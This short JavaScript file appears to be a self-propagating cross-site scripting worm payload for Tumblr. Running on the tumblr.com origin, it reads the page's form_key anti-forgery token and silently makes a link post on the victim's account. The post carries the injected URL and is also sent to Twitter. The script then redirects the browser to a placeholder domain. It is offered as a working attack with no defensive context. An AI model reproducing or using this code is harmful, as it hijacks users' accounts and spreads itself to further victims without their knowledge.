//save it as YOUR_INJECT_URL.js
//do anything you want - you are on 'tumblr.com' origin
var inject_js = '';
$$('a').each(function(a){ if(a.href.indexOf('ANYFUNNYURL.com') != -1){ inject_js = a.href} })
new Ajax.Request('/new/link', {parameters:{'post[date]':'now','post[source_url]':'http://','send_to_twitter':'on','is_rich_text[one]':0,'form_key':document.getElementById('form_key').value,'post[one]':'ANYFUNNYTITLE','post[two]':inject_js,'post[three]':'LONG FUNNY DESCRIPTION HAHA','post[type]':'link','channel_id':0,'post[state]':0,'is_rich_text[two]':0,'is_rich_text[three]':1}})
setTimeout(function(){
  document.location = "//ANYFUNNYURL.com";
},1000)

